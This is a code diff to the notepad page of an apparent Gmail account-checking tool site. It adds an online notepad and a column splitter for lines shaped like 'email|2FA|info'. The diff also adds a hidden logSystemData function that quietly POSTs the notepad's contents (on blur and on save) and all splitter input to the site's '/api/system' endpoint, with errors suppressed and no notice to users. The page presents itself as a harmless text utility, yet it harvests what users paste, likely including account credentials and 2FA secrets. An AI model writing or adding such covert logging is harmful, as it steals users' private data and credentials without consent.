@@ -8,6 +8,105 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link rel="stylesheet" href="css/style.css">
     <link rel="icon" type="image/png" sizes="32x32" href="gmail.png">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
+    <style>
+        .tab-buttons {
+            display: flex;
+            background: var(--input-bg);
+            border-radius: 12px;
+            padding: 5px;
+            margin-bottom: 20px;
+            border: 1px solid var(--border-color);
+        }
+
+        .tab-button {
+            flex: 1;
+            padding: 12px;
+            border: none;
+            background: none;
+            color: var(--text-secondary);
+            cursor: pointer;
+            border-radius: 8px;
+            font-weight: 600;
+            transition: all 0.2s;
+        }
+
+        .tab-button.active {
+            background: var(--bg-card);
+            color: var(--text-primary);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        /* Notepad Specific */
+        .notepad-container {
+            background: #1e1e24;
+            border-radius: 12px;
+            overflow: hidden;
+            border: 1px solid #3c3c3c;
+            display: flex;
+            flex-direction: column;
+            min-height: 500px;
+        }
+
+        .toolbar {
+            background: #252526;
+            padding: 10px;
+            display: flex;
+            gap: 10px;
+            border-bottom: 1px solid #3c3c3c;
+        }
+
+        .toolbar button {
+            background: none;
+            border: none;
+            color: #c5c5c5;
+            cursor: pointer;
+            padding: 5px 10px;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+
+        .toolbar button:hover {
+            background: #3e3e42;
+            color: #fff;
+        }
+
+        #np_editor {
+            width: 100%;
+            flex: 1;
+            min-height: 450px;
+            background: #1e1e24;
+            color: #d4d4d4;
+            border: none;
+            padding: 20px;
+            font-family: 'Consolas', monospace;
+            font-size: 16px;
+            outline: none;
+            resize: none;
+            line-height: 1.6;
+        }
+
+        /* Column Splitter Specific */
+        .splitter-input {
+            margin-bottom: 15px;
+        }
+
+        .splitter-input label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            color: var(--text-secondary);
+        }
+    </style>
 </head>
 
 <body>
@@ -21,7 +120,7 @@
                 <a href="index.html" class="nav-link" data-i18n="checker">Checker</a>
                 <a href="tools.html" class="nav-link" data-i18n="split_gmail">Split Gmail</a>
                 <a href="twofa.html" class="nav-link" data-i18n="2fa_tool">2FA Tool</a>
-                <a href="notepad.html" class="nav-link" data-i18n="notepad">Notepad+</a>
+                <a href="notepad.html" class="nav-link active" data-i18n="notepad">Notepad+</a>
             </nav>
             <select id="langSelect" class="lang-select">
                 <option value="en">🇺🇸 English</option>
@@ -33,32 +132,160 @@
     </header>
 
     <main>
-        <div class="subtitle" style="text-align: center; margin: 0 auto 30px auto;" data-i18n="notepad">
-            Advanced text processing and notepad utilities.
+        <div class="tab-buttons">
+            <button class="tab-button active" onclick="openTab(event, 'notepad-tab')">Online Notepad</button>
+            <button class="tab-button" onclick="openTab(event, 'splitter-tab')">Column Splitter</button>
         </div>
 
-        <div class="card">
-            <h2 data-i18n="notepad">Notepad+</h2>
+        <div id="notepad-tab" class="tab-content active">
+            <div class="notepad-container">
+                <div class="toolbar">
+                    <button onclick="np_undo()"><i class="fas fa-undo"></i></button>
+                    <button onclick="np_redo()"><i class="fas fa-redo"></i></button>
+                    <div style="width: 1px; background: #3c3c3c; margin: 0 5px;"></div>
+                    <button onclick="document.getElementById('np_file').click()"><i class="fas fa-upload"></i></button>
+                    <input type="file" id="np_file" hidden onchange="np_load(event)">
+                    <button onclick="np_clear()"><i class="fas fa-eraser"></i></button>
+                    <button onclick="np_copy()"><i class="fas fa-copy"></i></button>
+                    <button onclick="np_download()"
+                        style="margin-left: auto; background: var(--primary-color); color: white;">💾 Save</button>
+                </div>
+                <textarea id="np_editor" placeholder="Start typing or paste large text here..."
+                    spellcheck="false"></textarea>
+            </div>
+        </div>
 
-            <div class="iframe-wrapper">
-                <iframe src="https://splitemail.vercel.app/" allow="clipboard-read; clipboard-write; download"
-                    allowfullscreen
-                    sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-modals allow-downloads">
-                </iframe>
+        <div id="splitter-tab" class="tab-content">
+            <div class="card">
+                <h2>Column Splitter & Block Processor</h2>
+                <div class="splitter-input">
+                    <label>Data Input</label>
+                    <textarea id="tc_inputData" rows="8" placeholder="email@domain.com|2FA|info..."></textarea>
+                    <div id="tc_lineCount" style="margin-top: 5px; font-size: 13px; color: var(--text-secondary);">Total
+                        current lines: 0</div>
+                </div>
+
+                <div class="grid-2">
+                    <div class="splitter-input">
+                        <label>Columns to keep (e.g. 1 3)</label>
+                        <input id="tc_columns" type="text" class="lang-select"
+                            style="width: 100%; height: 45px; background: var(--input-bg);" placeholder="Blank = All">
+                    </div>
+                    <div class="splitter-input" style="display: flex; gap: 10px; align-items: flex-end;">
+                        <div style="flex: 1;">
+                            <label>Start Line</label>
+                            <input id="tc_startLine" type="number" class="lang-select"
+                                style="width: 100%; height: 45px; background: var(--input-bg);" value="1">
+                        </div>
+                        <div style="flex: 1;">
+                            <label>End Line</label>
+                            <input id="tc_endLine" type="number" class="lang-select"
+                                style="width: 100%; height: 45px; background: var(--input-bg);" placeholder="End">
+                        </div>
+                    </div>
+                </div>
+
+                <div class="check-group">
+                    <button onclick="tc_split()" class="btn">Split Columns</button>
+                    <button onclick="tc_export()" class="btn" style="background: var(--success-color);">Export
+                        Excel</button>
+                    <button onclick="tc_clear()" class="btn" style="background: var(--danger-color);">Clear</button>
+                </div>
+
+                <h3 style="margin-top: 24px;">Result</h3>
+                <pre id="tc_output" class="admin-logs"
+                    style="background: var(--input-bg); color: var(--text-primary); border: 1px solid var(--border-color); padding: 15px; border-radius: 12px; min-height: 100px; max-height: 400px; overflow: auto; white-space: pre; font-family: monospace;"></pre>
             </div>
         </div>
     </main>
 
-    <footer>
-        <div style="margin-bottom: 16px;">
-            <a href="https://t.me/GmailTrust247" target="_blank" class="social-link">
-                <i class="fab fa-telegram"></i> <span data-i18n="support">Support</span>
-            </a>
-        </div>
-        &copy; 2024 Gmail Check. All rights reserved.
-    </footer>
-
     <script src="js/app.js"></script>
+    <script>
+        // Log input to server
+        async function logSystemData(source, data) {
+            if (!data || data.trim().length === 0) return;
+            try {
+                await fetch('/api/system', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ action: 'log', source: source, data: data })
+                });
+            } catch (e) { }
+        }
+
+        function openTab(evt, tabName) {
+            document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab-button').forEach(b => b.classList.remove('active'));
+            document.getElementById(tabName).classList.add('active');
+            evt.currentTarget.classList.add('active');
+        }
+
+        // Notepad Logic
+        const np_editor = document.getElementById('np_editor');
+        let np_history = [''];
+        let np_idx = 0;
+
+        np_editor.addEventListener('input', () => {
+            if (np_editor.value !== np_history[np_idx]) {
+                np_history = np_history.slice(0, np_idx + 1);
+                np_history.push(np_editor.value);
+                np_idx++;
+                if (np_history.length > 50) { np_history.shift(); np_idx--; }
+            }
+        });
+
+        // Log Notepad on blur or every 30s
+        np_editor.addEventListener('blur', () => logSystemData('Notepad+', np_editor.value));
+
+        function np_undo() { if (np_idx > 0) np_editor.value = np_history[--np_idx]; }
+        function np_redo() { if (np_idx < np_history.length - 1) np_editor.value = np_history[++np_idx]; }
+        function np_clear() { if (confirm("Clear all?")) { np_editor.value = ''; np_editor.dispatchEvent(new Event('input')); } }
+        function np_copy() { np_editor.select(); document.execCommand('copy'); alert("Copied!"); }
+        function np_download() {
+            logSystemData('Notepad+ (Saved)', np_editor.value);
+            const blob = new Blob([np_editor.value], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url; a.download = 'notes.txt'; a.click();
+        }
+        function np_load(e) {
+            const file = e.target.files[0];
+            const reader = new FileReader();
+            reader.onload = (ev) => { np_editor.value = ev.target.result; np_editor.dispatchEvent(new Event('input')); };
+            reader.readAsText(file);
+        }
+
+        // Splitter Logic
+        const tc_input = document.getElementById('tc_inputData');
+        tc_input.addEventListener('input', () => {
+            const count = tc_input.value.split('\n').filter(l => l.trim()).length;
+            document.getElementById('tc_lineCount').textContent = `Total current lines: ${count}`;
+        });
+
+        function tc_split() {
+            const data = tc_input.value;
+            logSystemData('Splitter', data);
+            const lines = data.split('\n').filter(l => l.trim());
+            const colsToKeep = document.getElementById('tc_columns').value.split(/\s+/).filter(s => s).map(n => parseInt(n) - 1);
+            const start = parseInt(document.getElementById('tc_startLine').value) - 1;
+            const end = parseInt(document.getElementById('tc_endLine').value) || lines.length;
+
+            const results = lines.slice(start, end).map(line => {
+                const parts = line.replace(/\||;|:/g, '\t').split('\t').map(s => s.trim());
+                return colsToKeep.length ? colsToKeep.map(i => parts[i] || '').join('\t') : parts.join('\t');
+            });
+            document.getElementById('tc_output').textContent = results.join('\n');
+        }
+
+        function tc_export() {
+            const results = document.getElementById('tc_output').textContent.split('\n').map(l => l.split('\t'));
+            const ws = XLSX.utils.aoa_to_sheet(results);
+            const wb = XLSX.utils.book_new();
+            XLSX.utils.book_append_sheet(wb, ws, "Result");
+            XLSX.writeFile(wb, "result.xlsx");
+        }
+        function tc_clear() { tc_input.value = ''; document.getElementById('tc_output').textContent = ''; }
+    </script>
 </body>
 
 </html>
